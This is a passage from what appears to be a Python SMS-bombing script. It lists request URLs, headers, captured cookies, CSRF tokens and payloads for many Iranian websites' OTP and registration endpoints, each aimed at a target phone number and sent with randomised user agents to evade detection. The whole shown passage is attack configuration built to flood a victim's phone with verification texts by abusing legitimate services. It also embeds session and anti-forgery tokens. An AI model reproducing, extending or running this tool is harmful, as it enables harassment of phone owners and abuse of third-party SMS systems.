vrgl_sess=eyJpdiI6Imx1QTQzREJKNndmVVY2RGsxMFpwM1E9PSIsInZhbHVlIjoiNzl6WThDSjVsVy9VVWZteEZXZlJDdlBtaWpDdmFadVA2S2pGTDgvZ0x1eFVvQWZYTWlrdG01dFhQV3Qxczl4YWZHVFBFVDloeVNldFdRQWxpR09nNk8xWlJlb0R4NVlncmdHaFlzdTV1Nm9DSDZxaE9xSVhwSDJBTVZQOENDalIiLCJtYWMiOiIzNTE4ZjI2YjdkYmEyNDBmMTU4MzJiMDcxYmM1ZDVlNWJlOWYxODhmMWUyODYwZmI4MzM1MzJhOTlhYTRiOTBmIiwidGFnIjoiIn0%3D',
    'origin': 'https://virgool.io',
    'referer': 'https://virgool.io/register',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-xsrf-token': 'eyJpdiI6ImtGaEQxRFM5MFNud2xObklHNXowbmc9PSIsInZhbHVlIjoiSGNKWlM3RCttUlBpUW41YXJvbUkxTkg3MGlCVm4vUmw4VVQrN29YcnZDSHh0UkJTRWdTZzJZQ2ZKcXJDalBCZUNrQXhTTW04OXRRY0NZL3BKY0FnbHRpRXhDUzFXT1pDb2ZaZnJoa1YzN3dGa3RiODJHQjN3cEg5RXFIaDVnRlEiLCJtYWMiOiIzNTAyNTA0OWYyNmM1MTAwYzAyZTQ3MjJmMDg4MGNmYmZiMTcwYmUwZGY1MmIzYjkxNzQ1YzdiMDA2MjQyMDMyIiwidGFnIjoiIn0=',
}

json_data38 = {
    'method': 'phone',
    'identifier': '+98' + num0,
    'type': 'register',
}

url39 = "https://api.pooleno.ir/v1/auth/check-mobile"
headers39 = {
    'authority': 'api.pooleno.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://pooleno.ir',
    'referer': 'https://pooleno.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
}

json_data39 = {
    'mobile': num,
}

url40 = "https://ketabchi.com/api/v1/auth/requestVerificationCode"
cookies40 = {
    '_gcl_au': '1.1.1844168359.1693674847',
    '_ga': 'GA1.2.1077881638.1693674847',
    '_gid': 'GA1.2.1828058378.1693674847',
    '_gat': '1',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '6daece49-da62-4da1-83a3-9b578b40bcb2',
    'analytics_session_token': '3fcd17dc-f0ae-358f-8f8f-4c12002f1f87',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    '_ga_W2P8SNQZPE': 'GS1.2.1693674847.1.0.1693674847.60.0.0',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
}

headers40 = {
    'authority': 'ketabchi.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    # 'cookie': '_gcl_au=1.1.1844168359.1693674847; _ga=GA1.2.1077881638.1693674847; _gid=GA1.2.1828058378.1693674847; _gat=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=6daece49-da62-4da1-83a3-9b578b40bcb2; analytics_session_token=3fcd17dc-f0ae-358f-8f8f-4c12002f1f87; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; _ga_W2P8SNQZPE=GS1.2.1693674847.1.0.1693674847.60.0.0; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    'origin': 'https://ketabchi.com',
    'referer': 'https://ketabchi.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
}

json_data40 = {
    'auth': {
        'phoneNumber': num,
    },
}

url41 = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={num}"


url42 = "https://ketabweb.com/login/"
cookies42 = {
    'PHPSESSID': '664697d22cc442d16dc5fab4cbb8f8f2',
    'utm_source': 'google.com',
    '_clck': '4f5s3f|2|feo|0|1340',
    '_gid': 'GA1.2.545445782.1693675489',
    '_gat_gtag_UA_130861542_1': '1',
    '_ga_P6803V50TL': 'GS1.1.1693675489.1.1.1693675526.0.0.0',
    '_ga': 'GA1.2.1768033828.1693675489',
    '_clsk': '19m7jra|1693675527419|6|1|s.clarity.ms/collect',
}

headers42 = {
    'authority': 'ketabweb.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=664697d22cc442d16dc5fab4cbb8f8f2; utm_source=google.com; _clck=4f5s3f|2|feo|0|1340; _gid=GA1.2.545445782.1693675489; _gat_gtag_UA_130861542_1=1; _ga_P6803V50TL=GS1.1.1693675489.1.1.1693675526.0.0.0; _ga=GA1.2.1768033828.1693675489; _clsk=19m7jra|1693675527419|6|1|s.clarity.ms/collect',
    'origin': 'https://ketabweb.com',
    'referer': 'https://ketabweb.com/login',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

params42 = {
    'sendOTPCode': '1',
}

data42 = {
    'username': num,
    'isRegister': '1',
}

url43 = f"https://join.tapsi.ir/smsConfirm?phoneNumber={num}"

url44 = "https://api.timcheh.com/auth/otp/send"
headers44 = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://timcheh.com',
    'Referer': 'https://timcheh.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': fake.random,
    'X-Cart': 'null',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

json_data44 = {
    'mobile': num,
}



url45 = "https://api.pindo.ir/v1/user/login-register/"
headers45 = {
    'authority': 'api.pindo.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'client': 'desktop',
    'clientid': 'bc36fe78-08e2-4937-b7ef-da8fc9eebad5',
    'content-type': 'application/json',
    'origin': 'https://www.pindo.shop',
    'referer': 'https://www.pindo.shop/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'supernova-optimize-response': '1',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

json_data45 = {
    'phone': num,
}

url46 = "https://www.modiseh.com/customer/account/loginpost/"
cookies46 = {
    '__arcsco': 'ac8e1cc9fbc36615b5e3624dca784c66',
    'mage-cache-storage': '%7B%7D',
    'mage-cache-storage-section-invalidation': '%7B%7D',
    'css_first_load': '1',
    'chessio-matomo': '%7B%7D',
    'form_key': 'zB6pGjnctpSNsZUg',
    'form_key': 'zB6pGjnctpSNsZUg',
    'PHPSESSID': 'fnuvf4rlg7vdo6f3v3msfpo1js',
    'mage-cache-sessid': 'true',
    'recently_viewed_product': '%7B%7D',
    'recently_viewed_product_previous': '%7B%7D',
    'recently_compared_product': '%7B%7D',
    'recently_compared_product_previous': '%7B%7D',
    'product_data_storage': '%7B%7D',
    '_pk_id.1.9bd7': 'e8cd998ec494ba87.1693679770.',
    '_pk_ses.1.9bd7': '1',
    '_ga': 'GA1.1.292048814.1693679771',
    'analytics_token': 'c739c31f-7fc7-c27a-27ac-1a82ebcc028f',
    'analytics_session_token': 'cd1b6967-d85a-933a-c7b0-aee331f5c1aa',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    'section_data_ids': '%7B%22cart%22%3A1693679770%7D',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_hjSessionUser_3624377': 'eyJpZCI6IjU2MTY1ZTJlLTAxODAtNTNkZi1hNzZiLTBjMzUzYjY3NTA3OSIsImNyZWF0ZWQiOjE2OTM2Nzk3NzE5NjgsImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_3624377': '0',
    '_hjSession_3624377': 'eyJpZCI6IjU2NTY5OGZlLTBiZGItNDBiMC1iOTQ5LWNkMjg2MmEzMDcyNiIsImNyZWF0ZWQiOjE2OTM2Nzk3NzE5NzksImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    '_ga_EVKKB0D6C9': 'GS1.1.1693679770.1.0.1693679785.45.0.0',
}

headers46 = {
    'authority': 'www.modiseh.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__arcsco=ac8e1cc9fbc36615b5e3624dca784c66; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; css_first_load=1; chessio-matomo=%7B%7D; form_key=zB6pGjnctpSNsZUg; form_key=zB6pGjnctpSNsZUg; PHPSESSID=fnuvf4rlg7vdo6f3v3msfpo1js; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _pk_id.1.9bd7=e8cd998ec494ba87.1693679770.; _pk_ses.1.9bd7=1; _ga=GA1.1.292048814.1693679771; analytics_token=c739c31f-7fc7-c27a-27ac-1a82ebcc028f; analytics_session_token=cd1b6967-d85a-933a-c7b0-aee331f5c1aa; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; section_data_ids=%7B%22cart%22%3A1693679770%7D; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _hjSessionUser_3624377=eyJpZCI6IjU2MTY1ZTJlLTAxODAtNTNkZi1hNzZiLTBjMzUzYjY3NTA3OSIsImNyZWF0ZWQiOjE2OTM2Nzk3NzE5NjgsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_3624377=0; _hjSession_3624377=eyJpZCI6IjU2NTY5OGZlLTBiZGItNDBiMC1iOTQ5LWNkMjg2MmEzMDcyNiIsImNyZWF0ZWQiOjE2OTM2Nzk3NzE5NzksImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ga_EVKKB0D6C9=GS1.1.1693679770.1.0.1693679785.45.0.0',
    'origin': 'https://www.modiseh.com',
    'referer': 'https://www.modiseh.com/customer/account/login/referer/aHR0cHM6Ly93d3cubW9kaXNlaC5jb20v/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data46 = {
    'otp_code': '',
    'login[username]': '',
    'username': num,
    'pass': '',
    'my_pass': '',
    'is_force_login': '',
    'customer_set_password': '',
    'customer_set_password2': '',
    'form_key': 'zB6pGjnctpSNsZUg',
    'type': 'enter_mobile',
    'captcha[user_login]': '123456',
    'referer': 'aHR0cHM6Ly93d3cubW9kaXNlaC5jb20v',
}

url47 = "https://tagmond.com/phone_number"
cookies47 = {
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '81093964-33d9-e5c2-3a82-48ab06490dbd',
    'analytics_session_token': 'f8dfcbc9-c8d7-9c55-7dc4-59529b956d0d',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    'sib_cuid': '5b85e9a7-de36-4d86-8f16-ef908d69804f',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_gid': 'GA1.2.148085501.1693682019',
    '_ga_WWNJT1BX8R': 'GS1.1.1693682019.1.0.1693682019.60.0.0',
    '_ga': 'GA1.1.2027733242.1693682019',
    '_clck': '1m53qcf|2|feo|0|1340',
    '_clsk': '1rimb46|1693682022568|1|1|q.clarity.ms/collect',
    '_TAGZone_session': 'NE55aXFrVkQ5QXJYbUVhRWNTdzZwOUpFYUIrbEpVVHRyQ3hqM09oWi9nR2RpWGF1K0VNcE5wSEdzeHFOdHRxS0tpR3U4RGYyYnExcWFlTURxNDZlSUZFeXRLdTZTM2cvN2ZrL2NVaXRRK0paL2ZCc3dXdW9EN3ZwdjNvWFRWWFErNndPcWYzcUl0N0N4YlUvcDFCUkF2dUwyR3RsMTcyTkhaZ3pEclhaOVpSMm5xK01ZdE1jTUdBT2FDd3VPZGQxLS1BU3ZzYWVYUTlJK0IvN29aV0h1UjZBPT0%3D--ba1a41b137f2e541846f3e246b95465e70cac35c',
}

headers47 = {
    'Accept': '*/*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript',
    'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=81093964-33d9-e5c2-3a82-48ab06490dbd; analytics_session_token=f8dfcbc9-c8d7-9c55-7dc4-59529b956d0d; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; sib_cuid=5b85e9a7-de36-4d86-8f16-ef908d69804f; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _gid=GA1.2.148085501.1693682019; _ga_WWNJT1BX8R=GS1.1.1693682019.1.0.1693682019.60.0.0; _ga=GA1.1.2027733242.1693682019; _clck=1m53qcf|2|feo|0|1340; _clsk=1rimb46|1693682022568|1|1|q.clarity.ms/collect; _TAGZone_session=NE55aXFrVkQ5QXJYbUVhRWNTdzZwOUpFYUIrbEpVVHRyQ3hqM09oWi9nR2RpWGF1K0VNcE5wSEdzeHFOdHRxS0tpR3U4RGYyYnExcWFlTURxNDZlSUZFeXRLdTZTM2cvN2ZrL2NVaXRRK0paL2ZCc3dXdW9EN3ZwdjNvWFRWWFErNndPcWYzcUl0N0N4YlUvcDFCUkF2dUwyR3RsMTcyTkhaZ3pEclhaOVpSMm5xK01ZdE1jTUdBT2FDd3VPZGQxLS1BU3ZzYWVYUTlJK0IvN29aV0h1UjZBPT0%3D--ba1a41b137f2e541846f3e246b95465e70cac35c',
    'Origin': 'https://tagmond.com',
    'Referer': 'https://tagmond.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': fake.random,
    'X-CSRF-Token': 'E6G+Oby7GOZ8C7XpLwdLiyxLYsEaEVjqIvwXP1jJXX8cENK8cTaO3mppodg+N0PNwFgrI2xb5Vy5U03u1p8hGg==',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data47 = {
    'utf8': '✓',
    'custom_comment_body_hp_24124': '',
    'phone_number': num,
}

url48 = "https://www.webpoosh.com/register"
cookies48 = {
    'XSRF-TOKEN': 'eyJpdiI6InJyUldGaGJDaW1qVFozRjFBdGQ4V3c9PSIsInZhbHVlIjoiUnVWYStUUjhiVUg1bVhUUnRtd0ZnSWwyb0lxYXdTT1ZzeFI0NU1qRHpkcjNONXZEZUJwYXkyVGhyejUzeFpDZyIsIm1hYyI6IjFjNjQ3YmNkYjM0MmUyM2NlNmM3Njg4YWU2Yjg1NjMzMThiZTY2MTlkN2E4ODM0ODZkODdhNWU1NjUyODhlYjQifQ%3D%3D',
    'webpoosh_session': 'eyJpdiI6Imtld2Q4Y3NKcmVEQTV1bWZZZ3ZXTUE9PSIsInZhbHVlIjoiWVBPbXA4RVRIY1FSb1kyRVBnOCtZZldxWlY3d2dXXC9XQmswNEExSFBzRDRid1lRUVcrWGRqeld3Ykh6ZG9UK0UiLCJtYWMiOiJkNWNlNmEwMzhlNDU5OTY4NzQ0ZWUyMDVjMzhmZTI1ZWNiZTI1OTY3Yjk4MjVkNDdkZmYwOTg5MDY0NzA2ZDM1In0%3D',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '84b6c7ad-bf19-1aab-c9b6-3fb1cb165821',
    'analytics_session_token': '1ed18e2e-b745-b6b4-d731-4425141eeacf',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    '_ga': 'GA1.1.620344409.1693682483',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_ga_Y0FT859ZNZ': 'GS1.1.1693682482.1.1.1693682515.27.0.0',
}

headers48 = {
    'authority': 'www.webpoosh.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'XSRF-TOKEN=eyJpdiI6InJyUldGaGJDaW1qVFozRjFBdGQ4V3c9PSIsInZhbHVlIjoiUnVWYStUUjhiVUg1bVhUUnRtd0ZnSWwyb0lxYXdTT1ZzeFI0NU1qRHpkcjNONXZEZUJwYXkyVGhyejUzeFpDZyIsIm1hYyI6IjFjNjQ3YmNkYjM0MmUyM2NlNmM3Njg4YWU2Yjg1NjMzMThiZTY2MTlkN2E4ODM0ODZkODdhNWU1NjUyODhlYjQifQ%3D%3D; webpoosh_session=eyJpdiI6Imtld2Q4Y3NKcmVEQTV1bWZZZ3ZXTUE9PSIsInZhbHVlIjoiWVBPbXA4RVRIY1FSb1kyRVBnOCtZZldxWlY3d2dXXC9XQmswNEExSFBzRDRid1lRUVcrWGRqeld3Ykh6ZG9UK0UiLCJtYWMiOiJkNWNlNmEwMzhlNDU5OTY4NzQ0ZWUyMDVjMzhmZTI1ZWNiZTI1OTY3Yjk4MjVkNDdkZmYwOTg5MDY0NzA2ZDM1In0%3D; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=84b6c7ad-bf19-1aab-c9b6-3fb1cb165821; analytics_session_token=1ed18e2e-b745-b6b4-d731-4425141eeacf; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; _ga=GA1.1.620344409.1693682483; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _ga_Y0FT859ZNZ=GS1.1.1693682482.1.1.1693682515.27.0.0',
    'origin': 'https://www.webpoosh.com',
    'referer': 'https://www.webpoosh.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
}

data48 = {
    '_token': 'IphxpKXxvgbJ2UQJQSsut7aQNzpImOuazcQyuivZ',
    'cellphone': num,
}


url49 = "https://accounts.khanoumi.com/account/login/init"
cookies49 = {
    '_gcl_au': '1.1.557984032.1693682936',
    '_ga': 'GA1.1.1563026998.1693682937',
    '_ga_8LP4N80M49': 'GS1.1.1693682936.1.1.1693682939.57.0.0',
    'analytics_token': 'bf879deb-de98-0c88-2924-d0c34deed73c',
    'analytics_session_token': 'c014e508-6e2b-bd93-ab9d-2d888d28a3a5',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
}

headers49 = {
    'authority': 'accounts.khanoumi.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryYBwJyqzgVrDOVHYA',
    # 'cookie': '_gcl_au=1.1.557984032.1693682936; _ga=GA1.1.1563026998.1693682937; _ga_8LP4N80M49=GS1.1.1693682936.1.1.1693682939.57.0.0; analytics_token=bf879deb-de98-0c88-2924-d0c34deed73c; analytics_session_token=c014e508-6e2b-bd93-ab9d-2d888d28a3a5; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    'origin': 'https://accounts.khanoumi.com',
    'referer': 'https://accounts.khanoumi.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
}

data49 = f'------WebKitFormBoundaryYBwJyqzgVrDOVHYA\r\nContent-Disposition: form-data; name="applicationId"\r\n\r\nb92fdd0f-a44d-4fcc-a2db-6d955cce2f5e\r\n------WebKitFormBoundaryYBwJyqzgVrDOVHYA\r\nContent-Disposition: form-data; name="loginIdentifier"\r\n\r\n{num}\r\n------WebKitFormBoundaryYBwJyqzgVrDOVHYA\r\nContent-Disposition: form-data; name="loginSchemeName"\r\n\r\nsms\r\n------WebKitFormBoundaryYBwJyqzgVrDOVHYA--\r\n'

url50 = "https://api.esam.ir/api/account/RegisterOrLogin"
headers50 = {
    'authority': 'api.esam.ir',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://esam.ir',
    'referer': 'https://esam.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
}

json_data50 = {
    'mobile': num,
    'present_type': 'WebApp',
    'registration_method': 0,
    'serialNumber': '',
}

url51 = "https://mashadkala.com/Customer/ApiLoginFull"
cookies51 = {
    '.Nop.Customer': 'a63c606e-46a9-4ca3-8f06-425dc60d956e',
    '.Nop.Antiforgery': 'CfDJ8BNfhCpIfbZFiP0cWbPZCP_ev35UMBq9yU9YVt0A5f0SrWGZn-EJc223NcdPrUBxo1gAasq0hUBMZYWsmrwnsbVIOKOdInfho42A7aTc6SYJLyIcNVbl0QWaXVNRjKwD-LJkerhJhTDwA__DFxcP-nk',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '5982b7b5-c6ee-210a-1417-78999a905aa5',
    'analytics_session_token': '4601f603-9b08-3d9b-bd59-3e86bff58627',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    '__utma': '254345492.356946801.1693683800.1693683800.1693683800.1',
    '__utmc': '254345492',
    '__utmz': '254345492.1693683800.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    '__utmt': '1',
    '__utmb': '254345492.1.10.1693683800',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_ga_9KEFGRJ73B': 'GS1.1.1693683801.1.0.1693683801.60.0.0',
    '_ga': 'GA1.2.340266274.1693683802',
    '_gid': 'GA1.2.745258617.1693683802',
    '_gat_UA-69589910-2': '1',
    '_clck': '1koq0c3|2|feo|0|1340',
    '_clsk': '12o79wh|1693683803361|1|1|q.clarity.ms/collect',
}

headers51 = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryaNRzYfql15asmYmR',
    # 'Cookie': '.Nop.Customer=a63c606e-46a9-4ca3-8f06-425dc60d956e; .Nop.Antiforgery=CfDJ8BNfhCpIfbZFiP0cWbPZCP_ev35UMBq9yU9YVt0A5f0SrWGZn-EJc223NcdPrUBxo1gAasq0hUBMZYWsmrwnsbVIOKOdInfho42A7aTc6SYJLyIcNVbl0QWaXVNRjKwD-LJkerhJhTDwA__DFxcP-nk; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=5982b7b5-c6ee-210a-1417-78999a905aa5; analytics_session_token=4601f603-9b08-3d9b-bd59-3e86bff58627; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; __utma=254345492.356946801.1693683800.1693683800.1693683800.1; __utmc=254345492; __utmz=254345492.1693683800.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; __utmb=254345492.1.10.1693683800; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _ga_9KEFGRJ73B=GS1.1.1693683801.1.0.1693683801.60.0.0; _ga=GA1.2.340266274.1693683802; _gid=GA1.2.745258617.1693683802; _gat_UA-69589910-2=1; _clck=1koq0c3|2|feo|0|1340; _clsk=12o79wh|1693683803361|1|1|q.clarity.ms/collect',
    'Origin': 'https://mashadkala.com',
    'Referer': 'https://mashadkala.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': fake.random,
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data51 = f'------WebKitFormBoundaryaNRzYfql15asmYmR\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n{num}\r\n------WebKitFormBoundaryaNRzYfql15asmYmR\r\nContent-Disposition: form-data; name="ReturnUrl"\r\n\r\n\r\n------WebKitFormBoundaryaNRzYfql15asmYmR\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nCfDJ8BNfhCpIfbZFiP0cWbPZCP8c6bnOrFLo9UvvuM1s2O4lddLqv8gPqT_Kx8ncoPpNSy4S07y3tcPf3FU-TAMOIKHJ0AkBlF0LRFfquJznYhsH5SZL4Wh_v0F2BTplIT26YA2M7FBuffQo3CK5Buk85Yg\r\n------WebKitFormBoundaryaNRzYfql15asmYmR\r\nContent-Disposition: form-data; name="step"\r\n\r\n1\r\n------WebKitFormBoundaryaNRzYfql15asmYmR--\r\n'


url52 = "https://www.danielleeiran.com/account/sendverificationcode"
cookies52 = {
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '0cf0adbf-6b7a-a5b2-af2e-fa4d122c5d4b',
    'analytics_session_token': '5df943f7-b658-a64b-277c-57672fc96c4f',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    '_ga_2S3Q9FQ07Z': 'GS1.1.1693684137.1.0.1693684137.0.0.0',
    '_ga': 'GA1.2.1393753814.1693684138',
    '_gid': 'GA1.2.231290796.1693684138',
    '_gat_gtag_UA_132551469_1': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '__RequestVerificationToken': 'xXRm8fw9TYx1m8xqNpZzNGW6z4hJvNoJwankFk0USsWPvwHl_1rpUtRaPjZgmbB0NSPGnaYHscHcutTx7sYaX8BN82xydLyLPbA6Mr3rPDk1',
}

headers52 = {
    'authority': 'www.danielleeiran.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryDcrNXMBMkae5elIw',
    # 'cookie': 'analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=0cf0adbf-6b7a-a5b2-af2e-fa4d122c5d4b; analytics_session_token=5df943f7-b658-a64b-277c-57672fc96c4f; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; _ga_2S3Q9FQ07Z=GS1.1.1693684137.1.0.1693684137.0.0.0; _ga=GA1.2.1393753814.1693684138; _gid=GA1.2.231290796.1693684138; _gat_gtag_UA_132551469_1=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; __RequestVerificationToken=xXRm8fw9TYx1m8xqNpZzNGW6z4hJvNoJwankFk0USsWPvwHl_1rpUtRaPjZgmbB0NSPGnaYHscHcutTx7sYaX8BN82xydLyLPbA6Mr3rPDk1',
    'origin': 'https://www.danielleeiran.com',
    'referer': 'https://www.danielleeiran.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
